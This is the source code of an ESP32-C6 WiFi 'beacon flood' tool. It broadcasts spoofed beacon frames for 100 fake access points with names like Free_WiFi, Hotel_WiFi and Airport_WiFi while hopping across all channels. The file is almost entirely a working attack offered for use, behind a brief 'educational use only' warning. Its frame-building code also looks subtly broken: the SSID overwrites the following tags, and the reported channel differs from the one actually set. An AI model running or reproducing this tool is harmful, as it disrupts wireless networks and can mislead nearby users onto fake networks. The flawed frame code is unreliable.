/*
 * W6 — Beacon Flood
 * Generate hundreds of fake WiFi access points (beacon flood attack)
 * 
 * Hardware: ESP32-C6
 * 
 * Features:
 *   - Generate 100+ fake APs with custom SSIDs
 *   - Channel hopping across all WiFi channels
 *   - Configurable SSID prefix and count
 *   - Real-time statistics on OLED/display
 * 
 * WARNING: Educational use only. Test on your own lab network.
 * 
 * Author: 5h4d0wn1k
 * License: MIT
 * Date: 2026-08-26
 */

#include <WiFi.h>
#include <esp_wifi.h>

// Configuration
#define MAX_SSIDS 100
#define SSID_PREFIX "Free_WiFi"
#define CHANNEL_HOP_INTERVAL 100  // ms between channel hops

// Fake SSID list
char fake_ssids[MAX_SSIDS][33];
int ssid_count = 0;
int current_ssid = 0;
uint32_t beacon_count = 0;
uint32_t last_channel_hop = 0;

// Beacon frame template (802.11 management frame)
uint8_t beacon_frame[] = {
    0x80, 0x00,  // Frame control: Beacon
    0x00, 0x00,  // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (will be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (will be filled)
    0x00, 0x00,  // Sequence number
    // Fixed parameters
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
    0x64, 0x00,  // Beacon interval (100 TU)
    0x01, 0x04,  // Capability info: ESS + Short preamble
    // Tagged parameters
    0x01, 0x08,  // SSID tag
    // SSID will be inserted here
    0x03, 0x01, 0x06,  // Supported rates: 802.11b/g
    0x05, 0x04,  // DS Parameter set
    0x01, 0x01, 0x00, 0x00  // DTIM period, DTIM count
};

// Function prototypes
void generateSSIDs();
void sendBeacon();
void hopChannels();
void showHelp();
void processSerialCommand();

void setup() {
    Serial.begin(115200);
    Serial.println("\n=== W6 — Beacon Flood ===");
    Serial.println("Generate fake WiFi access points");
    Serial.println("WARNING: Educational use only!");
    Serial.println();
    
    // Initialize WiFi in monitor mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    // Set WiFi to monitor mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(NULL);  // Accept all frames
    
    // Generate fake SSIDs
    generateSSIDs();
    
    Serial.printf("Generated %d fake SSIDs\n", ssid_count);
    Serial.println("Starting beacon flood...");
    Serial.println("Press any key to stop\n");
}

void loop() {
    // Send beacons for current SSID
    sendBeacon();
    
    // Hop channels periodically
    if (millis() - last_channel_hop >= CHANNEL_HOP_INTERVAL) {
        hopChannels();
        last_channel_hop = millis();
        
        // Rotate to next SSID
        current_ssid = (current_ssid + 1) % ssid_count;
    }
    
    // Check for stop command
    if (Serial.available()) {
        char cmd = Serial.read();
        if (cmd == 's' || cmd == 'S') {
            Serial.println("\nBeacon flood stopped.");
            Serial.printf("Total beacons sent: %lu\n", beacon_count);
            while (1) delay(1000);
        }
    }
}

void generateSSIDs() {
    ssid_count = 0;
    
    // Generate SSIDs with different patterns
    for (int i = 0; i < MAX_SSIDS; i++) {
        // Different SSID patterns
        if (i < 20) {
            // Pattern 1: Free_WiFi_N
            snprintf(fake_ssids[i], 33, "%s_%d", SSID_PREFIX, i);
        } else if (i < 40) {
            // Pattern 2: CoffeeShop_N
            snprintf(fake_ssids[i], 33, "CoffeeShop_%d", i - 20);
        } else if (i < 60) {
            // Pattern 3: Guest_Network_N
            snprintf(fake_ssids[i], 33, "Guest_Network_%d", i - 40);
        } else if (i < 80) {
            // Pattern 4: Hotel_WiFi_N
            snprintf(fake_ssids[i], 33, "Hotel_WiFi_%d", i - 60);
        } else {
            // Pattern 5: Airport_WiFi_N
            snprintf(fake_ssids[i], 33, "Airport_WiFi_%d", i - 80);
        }
        
        ssid_count++;
    }
}

void sendBeacon() {
    // Create beacon frame with current SSID
    uint8_t frame[256];
    int len = sizeof(beacon_frame);
    memcpy(frame, beacon_frame, len);
    
    // Set random source/BSSID
    uint8_t bssid[6];
    bssid[0] = 0xAA;
    bssid[1] = 0xBB;
    bssid[2] = 0xCC;
    bssid[3] = 0xDD;
    bssid[4] = 0xEE;
    bssid[5] = current_ssid & 0xFF;
    
    memcpy(&frame[10], bssid, 6);  // Source
    memcpy(&frame[16], bssid, 6);  // BSSID
    
    // Insert SSID
    int ssid_len = strlen(fake_ssids[current_ssid]);
    frame[37] = ssid_len;  // SSID tag length
    memcpy(&frame[38], fake_ssids[current_ssid], ssid_len);
    
    // Update frame length
    len = 38 + ssid_len + 10;  // Header + SSID + other tags
    
    // Send beacon
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    
    beacon_count++;
    
    // Print status every 100 beacons
    if (beacon_count % 100 == 0) {
        Serial.printf("\r[BEACON #%lu] SSID: %-32s | Channel: %d",
                     beacon_count, fake_ssids[current_ssid], (current_ssid % 14) + 1);
    }
}

void hopChannels() {
    // Hop to next channel (1-14)
    static int channel = 1;
    channel = (channel % 14) + 1;
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

void showHelp() {
    Serial.println("\n=== Commands ===");
    Serial.println("s/S - Stop beacon flood");
    Serial.println("================\n");
}

void processSerialCommand() {
    // Not used in main loop
}
